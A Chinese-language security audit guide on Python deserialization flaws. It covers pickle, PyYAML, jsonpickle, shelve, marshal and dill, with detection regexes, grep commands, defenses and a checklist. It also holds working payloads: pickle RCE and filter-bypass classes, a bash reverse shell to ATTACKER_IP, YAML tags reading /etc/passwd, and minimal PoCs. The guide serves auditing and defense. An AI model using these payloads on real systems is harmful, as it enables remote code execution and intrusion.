# Python Deserialization Deep Dive

> Python 反序列化漏洞深度审计模块
> 覆盖: Pickle, PyYAML, jsonpickle, shelve, marshal, dill

---

## Overview

Python 反序列化漏洞是最严重的安全风险之一，可直接导致 RCE。不同于 Java 需要复杂 Gadget 链，Python 的 `__reduce__` 机制使得利用极为简单。

---

## Pickle 深度分析

### 1. 核心原理

```python
# Pickle 协议核心: __reduce__ 魔术方法
# 反序列化时自动调用，返回 (callable, args) 元组

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('whoami',))

# 序列化时: pickle.dumps(Exploit())
# 反序列化时: os.system('whoami') 被执行
```

### 2. Pickle 操作码分析

```
重要操作码 (Protocol 0-4):
c - GLOBAL: 导入模块.函数 (c os\nsystem\n)
R - REDUCE: 调用栈顶函数
i - INST: 实例化类
o - OBJ: 构建对象
b - BUILD: 调用 __setstate__
( - MARK: 标记开始
t - TUPLE: 创建元组
] - EMPTY_LIST: 空列表
} - EMPTY_DICT: 空字典
. - STOP: 结束

# Protocol 4 新增:
\x8c - SHORT_BINUNICODE
\x94 - MEMOIZE
\x95 - FRAME
```

### 3. Payload 变体

```python
# 基础 RCE
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

# 反弹 Shell
class ReverseShell:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, ([
            '/bin/bash', '-c',
            'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
        ],))

# 文件写入
class WriteFile:
    def __reduce__(self):
        return (eval, ("open('/tmp/pwned','w').write('hacked')",))

# 多命令执行
class MultiCmd:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id') or __import__('os').system('whoami')",))

# 绕过简单过滤
class Bypass:
    def __reduce__(self):
        # 使用 getattr 绕过直接引用
        return (getattr, (__import__('os'), 'system'), ('id',))

# 利用 __setstate__
class SetStateExploit:
    def __reduce__(self):
        return (self.__class__, ())

    def __setstate__(self, state):
        import os
        os.system('id')
```

### 4. 检测规则

```regex
# 高危函数
pickle\.loads?\s*\(
pickle\.Unpickler\s*\(
_pickle\.loads?\s*\(
cPickle\.loads?\s*\(

# 危险模式
pickle\.(loads?|Unpickler).*request\.|\.data|\.body|\.content
pickle\.(loads?|Unpickler).*open\(|file\(|\.read\(\)

# 网络接收后反序列化
socket.*recv.*pickle\.loads
request\.(data|body|content).*pickle

# Redis/缓存反序列化
redis\.get.*pickle\.loads
cache\.get.*pickle\.loads
```

### 5. 安全绕过技术

```python
# 绕过 find_class 限制
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "builtins" and name in safe_builtins:
            return getattr(builtins, name)
        raise pickle.UnpicklingError(f"global '{module}.{name}' is forbidden")

# 绕过方法1: 使用 __builtin__ (Python 2) 或 builtins
# c__builtin__\neval\n

# 绕过方法2: 利用已允许的类的属性
# 如果允许 collections.OrderedDict, 可能通过其属性链到达危险函数

# 绕过方法3: 利用 copyreg 注册的 reducer
import copyreg
# 检查 copyreg.dispatch_table 中的可利用项
```

---

## PyYAML 深度分析

### 1. 版本差异

```yaml
# PyYAML < 5.1: 默认不安全
yaml.load(data)  # 直接 RCE

# PyYAML >= 5.1: 需要指定 Loader
yaml.load(data, Loader=yaml.Loader)        # 不安全
yaml.load(data, Loader=yaml.FullLoader)    # 部分安全，但仍有风险
yaml.load(data, Loader=yaml.UnsafeLoader)  # 不安全
yaml.safe_load(data)                        # 安全
```

### 2. YAML 标签利用

```yaml
# Python 对象实例化
!!python/object:__main__.MyClass
  attr: value

# 函数调用 (< 5.1)
!!python/object/apply:os.system
  args: ['id']

# 新实例 (< 5.1)
!!python/object/new:os.system
  args: ['id']

# subprocess 调用
!!python/object/apply:subprocess.check_output
  args: [['id']]

# 获取输出
!!python/object/apply:subprocess.check_output
  args:
    - ['cat', '/etc/passwd']

# 利用 tuple 执行
!!python/object/new:tuple
  - !!python/object/apply:os.system
    - 'id'
```

### 3. FullLoader 绕过 (CVE-2020-1747)

```yaml
# PyYAML 5.1 - 5.3.1 FullLoader 仍可利用
!!python/object/apply:os.system ["id"]

# 通过 extend 方法
!!python/object/apply:list.extend
  - []
  - !!python/object/apply:os.system ["id"]
```

### 4. 检测规则

```regex
# 危险加载
yaml\.load\s*\([^)]*\)(?!\s*,\s*Loader\s*=\s*yaml\.SafeLoader)
yaml\.load\s*\(.*Loader\s*=\s*yaml\.(Loader|FullLoader|UnsafeLoader)

# 危险标签检测 (输入验证)
!!\s*python/(object|module|name|apply|new)
```

---

## jsonpickle 深度分析

### 1. 利用方法

```python
import jsonpickle

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

# 序列化
payload = jsonpickle.encode(Exploit())
# {"py/reduce": [{"py/function": "nt.system"}, {"py/tuple": ["id"]}]}

# 手工构造 payload
malicious_json = '''
{
    "py/reduce": [
        {"py/function": "subprocess.check_output"},
        {"py/tuple": [["id"]]}
    ]
}
'''

# 反序列化触发
jsonpickle.decode(malicious_json)
```

### 2. 检测规则

```regex
jsonpickle\.decode\s*\(
jsonpickle\.unpickler\.Unpickler

# JSON 内容检测
"py/reduce"|"py/object"|"py/function"
```

---

## shelve 模块

### 1. 利用方法

```python
import shelve

# shelve 底层使用 pickle
db = shelve.open('data.db')

# 如果 db 文件可被攻击者控制
# 读取时自动反序列化
value = db['key']  # 触发 pickle.loads
```

### 2. 检测规则

```regex
shelve\.open\s*\(.*request|user|input
shelve\.open\s*\(.*\.GET|\.POST|\.data
```

---

## marshal 模块

### 1. 利用方法

```python
import marshal
import types

# marshal 用于序列化代码对象
# 可用于执行任意代码

# 创建恶意代码对象
code = compile("__import__('os').system('id')", "<string>", "exec")
payload = marshal.dumps(code)

# 反序列化并执行
code_obj = marshal.loads(payload)
exec(code_obj)  # RCE
```

### 2. 检测规则

```regex
marshal\.loads?\s*\(
types\.FunctionType\s*\(.*marshal
```

---

## dill 模块 (扩展 pickle)

### 1. 利用方法

```python
import dill

# dill 可以序列化 lambda、闭包等
# 同样存在 __reduce__ 漏洞

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = dill.dumps(Exploit())
dill.loads(payload)  # RCE
```

### 2. 检测规则

```regex
dill\.loads?\s*\(
dill\.Unpickler\s*\(
```

---

## 框架特定漏洞

### Django Session (Pickle)

```python
# settings.py
SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'
# 危险! 如果 SECRET_KEY 泄露，可伪造 session 实现 RCE

# 检测规则
SESSION_SERIALIZER.*PickleSerializer
```

### Flask Session (itsdangerous)

```python
# Flask 默认使用 itsdangerous 签名
# 如果 SECRET_KEY 泄露，可伪造 session

# 检测 SECRET_KEY 硬编码
app.secret_key = 'hardcoded_key'
SECRET_KEY = 'weak_key'
```

### Celery (pickle 序列化)

```python
# Celery 默认使用 pickle 序列化任务参数
# 如果消息队列可被访问，可注入恶意任务

# celeryconfig.py
CELERY_TASK_SERIALIZER = 'pickle'  # 危险
CELERY_ACCEPT_CONTENT = ['pickle']  # 危险

# 安全配置
CELERY_TASK_SERIALIZER = 'json'
CELERY_ACCEPT_CONTENT = ['json']
```

### Redis/Memcached

```python
# 使用 pickle 缓存对象
cache.set('key', pickle.dumps(obj))
obj = pickle.loads(cache.get('key'))

# 如果缓存可被污染，可导致 RCE
```

---

## 防御与安全实践

### 1. 禁用 pickle

```python
# 使用 JSON 替代
import json
data = json.loads(user_input)

# 使用 yaml.safe_load
import yaml
data = yaml.safe_load(user_input)
```

### 2. 签名验证

```python
import hmac
import pickle

SECRET_KEY = b'secure_random_key'

def secure_dumps(obj):
    data = pickle.dumps(obj)
    sig = hmac.new(SECRET_KEY, data, 'sha256').hexdigest()
    return data, sig

def secure_loads(data, sig):
    expected = hmac.new(SECRET_KEY, data, 'sha256').hexdigest()
    if not hmac.compare_digest(sig, expected):
        raise ValueError("Invalid signature")
    return pickle.loads(data)
```

### 3. 受限 Unpickler

```python
import pickle
import io

SAFE_MODULES = {'collections', 'datetime'}
SAFE_NAMES = {'OrderedDict', 'datetime', 'date'}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module in SAFE_MODULES and name in SAFE_NAMES:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(
            f"global '{module}.{name}' is forbidden"
        )

def restricted_loads(s):
    return RestrictedUnpickler(io.BytesIO(s)).load()
```

---

## 审计清单

```
[ ] 搜索所有 pickle.loads/load 调用
[ ] 检查数据来源是否可控
[ ] 检查是否有签名验证
[ ] 搜索 yaml.load 调用，确认 Loader 类型
[ ] 检查 jsonpickle.decode 调用
[ ] 检查 shelve/marshal/dill 使用
[ ] 检查 Django SESSION_SERIALIZER 配置
[ ] 检查 Celery TASK_SERIALIZER 配置
[ ] 检查 Redis/Memcached 缓存序列化方式
[ ] 检查 SECRET_KEY 是否硬编码或泄露
```

---

## 检测命令

```bash
# Pickle 检测
grep -rn "pickle\.\(loads\?\|Unpickler\)" --include="*.py"

# YAML 检测
grep -rn "yaml\.load\s*(" --include="*.py" | grep -v "safe_load\|SafeLoader"

# jsonpickle 检测
grep -rn "jsonpickle\.decode" --include="*.py"

# 全面检测
grep -rn "pickle\|yaml\.load\|jsonpickle\|shelve\|marshal\.loads\|dill" --include="*.py"

# Django session 检测
grep -rn "PickleSerializer\|SESSION_SERIALIZER" --include="*.py"

# Celery 配置检测
grep -rn "CELERY_TASK_SERIALIZER\|CELERY_ACCEPT_CONTENT" --include="*.py"
```

---

## 最小 PoC 示例
```bash
# Pickle RCE
python - <<'PY'
import pickle,os
class P(object):
    def __reduce__(self):
        return (os.system,("id",))
print(pickle.dumps(P()))
PY

# PyYAML unsafe load
python - <<'PY'
import yaml
print(yaml.load("!!python/object/apply:os.system ['id']", Loader=yaml.UnsafeLoader))
PY
```

---

## 参考资源

- [Pickle Security](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
- [PyYAML Deserialization](https://blog.nelhage.com/2020/05/exploiting-pyyaml/)
- [Python Deserialization Attack](https://www.exploit-db.com/docs/english/47655-python-deserialization-attack.pdf)

---

**最后更新**: 2026-01-23
**版本**: 1.0.0
